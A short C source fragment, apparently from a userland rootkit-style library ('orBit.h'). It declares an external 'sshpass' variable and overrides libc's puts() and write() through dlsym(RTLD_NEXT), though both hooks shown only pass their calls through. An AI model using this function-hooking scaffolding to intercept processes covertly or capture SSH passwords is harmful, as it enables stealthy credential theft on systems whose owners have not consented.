#include "orBit.h"
int         orbit_dbg = 0;
extern uint8_t     sshpass;


int puts( const char *s )
{
	static int ( *orig_puts ) ( const char * ) = NULL;
	if ( ! orig_puts )
		orig_puts = (int (*) ( const char * )) dlsym ( RTLD_NEXT, "puts");
	int res = orig_puts( s );
   
    return ( res );

}

ssize_t write( int fd, const void *buf, size_t count )
{
	static ssize_t ( *orig_write ) ( int, const void *, size_t ) = NULL;
	if ( ! orig_write )
		orig_write = (ssize_t (*) ( int, const void *, size_t )) dlsym ( RTLD_NEXT, "write");
	ssize_t res = orig_write( fd, buf, count );
    return ( res );
}
